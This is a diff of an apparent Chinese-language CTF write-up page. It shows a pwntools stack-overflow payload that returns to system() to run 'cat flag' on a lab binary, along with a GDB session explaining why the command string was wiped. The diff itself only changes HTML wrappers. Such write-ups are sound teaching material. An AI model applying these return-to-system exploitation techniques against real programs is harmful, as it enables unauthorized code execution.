@@ -69,7 +69,7 @@
 
 <p>可以把参数放在结构体的开头，shellcode 大致就是这个样子的</p>
 
-<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
 <span class="n">student</span> <span class="o">=</span> <span class="mh">0x7fffffffe2f0</span>
 <span class="n">cmd</span> <span class="o">=</span> <span class="s">"cat flag</span><span class="se">\x00</span><span class="s">"</span>
@@ -83,8 +83,7 @@
 <span class="n">shellcode</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x400550</span><span class="p">)</span>
 
 <span class="k">print</span> <span class="n">shellcode</span>
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>但是在 GDB 中直接运行会发现进程虽然启动了 <code class="highlighter-rouge">/bin/sh</code>，但是 <code class="highlighter-rouge">cat</code> 没有执行，为了调试这个问题，还是先搞清楚 <code class="highlighter-rouge">system</code> 的实现比较好。</p>
 
@@ -112,7 +111,7 @@ new_argv[3] = NULL;  // 代表数组结束
 
 <p>如果说看到新的 <code class="highlighter-rouge">/bin/sh</code> 进程启动了，但是命令没有执行，那一般就出在 <code class="highlighter-rouge">fork</code> 之后的步骤了，所以我们在 <code class="highlighter-rouge">__execve</code> 上下断点，看下参数是否正确。</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>➜  new gdb vuln
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  new gdb vuln
 Breakpoint 1 at 0x400550
 gdb-peda$ r &lt; in.txt
 
@@ -148,15 +147,14 @@ Legend: code, data, rodata, value
 
 Thread 2.1 "vuln" hit Breakpoint 2, execve () at ../sysdeps/unix/syscall-template.S:84
 84	../sysdeps/unix/syscall-template.S: No such file or directory.
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>可以看出程序停在了 <code class="highlighter-rouge">execve</code> 函数内部的开头，这个函数是三个参数，所以检查 rdi, rsi, rdx 三个寄存器就可以了。</p>
 
 <p>rdi 在上面可以直接看到，是 <code class="highlighter-rouge">/bin/sh</code> 没问题。
 rsi 是第二个参数，类型是 <code class="highlighter-rouge">char *const argv[]</code>，也就是指针数组，先看下地址</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>gdb-peda$ x/4xg $rsi
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda$ x/4xg $rsi
 0x7fffffffe208:	0x00007ffff7b99d1c	0x00007ffff7b99d14
 0x7fffffffe218:	0x00007fffffffe2f0	0x0000000000000000
 
@@ -169,12 +167,11 @@ gdb-peda$ x/s 0x00007fffffffe2f0
 
 gdb-peda$ x/8xb 0x00007fffffffe2f0
 0x7fffffffe2f0:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>目前 <code class="highlighter-rouge">argv</code> 是 <code class="highlighter-rouge">["sh", "-c", "", NULL]</code> 的状态，第一个参数惯例都是进程自己的路径，第二个 <code class="highlighter-rouge">-c</code> 也是预期的，而第三个应该是我们执行的指令才对，也就是 <code class="highlighter-rouge">echo</code>，而现在这个地址指向的内存都变成了0，所以 <code class="highlighter-rouge">execve</code> 就会出错。但是这个地址是 <code class="highlighter-rouge">student</code> 结构体的起始位置，为什么会被清空了呢？这时候就需要监视变量或者内存地址的指令了，那就是 <code class="highlighter-rouge">watch</code>。</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>➜  new gdb vuln
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  new gdb vuln
 gdb-peda$ b system
 Breakpoint 1 at 0x400550
 gdb-peda$ r &lt; in.txt
@@ -226,14 +223,13 @@ Old value = 0x6f686365
 New value = 0x0
 0x00007ffff7a51e60 in do_system (line=0x7ffff7a51e60 "") at ../sysdeps/posix/system.c:66
 66	in ../sysdeps/posix/system.c
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>在 <code class="highlighter-rouge">0x7ffff7a51e60</code> <code class="highlighter-rouge">rep stos QWORD PTR es:[rdi],rax</code> 指令这里修改了 <code class="highlighter-rouge">0x7ffff7a51e60</code> 的内容，<code class="highlighter-rouge">New value</code> 就是 0。</p>
 
 <p><code class="highlighter-rouge">rep</code> 执行可以加在很多指令前面，表示循环执行 <code class="highlighter-rouge">$rdx</code> 次，<code class="highlighter-rouge">stos QWORD PTR es:[rdi],rax</code> 是把 RAX 寄存器的值（目前为0）复制到 ，再查看相关的内存地址果然是这样的。</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>gdb-peda$ x/128xb 0x7fffffffe2f0
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda$ x/128xb 0x7fffffffe2f0
 0x7fffffffe2f0:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
 0x7fffffffe2f8:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
 0x7fffffffe300:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
@@ -245,12 +241,11 @@ New value = 0x0
 0x7fffffffe330:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
 0x7fffffffe338:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
 0x7fffffffe340:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>搞清楚哪部分数据会被覆盖就可以针对性的改写 shellcode 了，可以把命令行放在最后面。</p>
 
-<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
 <span class="n">student</span> <span class="o">=</span> <span class="mh">0x7fffffffe2f0</span>
 <span class="c"># 确定后面会是 \x00 了就先不手写结束符了，方便定位地址，否则 cmd 会变成 9 个字节</span>
@@ -266,10 +261,9 @@ New value = 0x0
 <span class="n">shellcode</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x400550</span><span class="p">)</span>
 
 <span class="k">print</span> <span class="n">shellcode</span>
-</code></pre>
-</div>
+</code></pre></div></div>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>gdb-peda$ r &lt; in.txt
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda$ r &lt; in.txt
 Starting program: /home/virusdefender/Desktop/pwn/new/vuln &lt; in.txt
 0x7fffffffe2f0What's Your Birth?
 What's Your Name?
@@ -282,8 +276,7 @@ process 20726 is executing new program: /bin/dash
 process 20727 is executing new program: /bin/cat
 THIS_IS_FLAG
 [Inferior 3 (process 20727) exited normally]
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h2 id="参考">参考</h2>
 
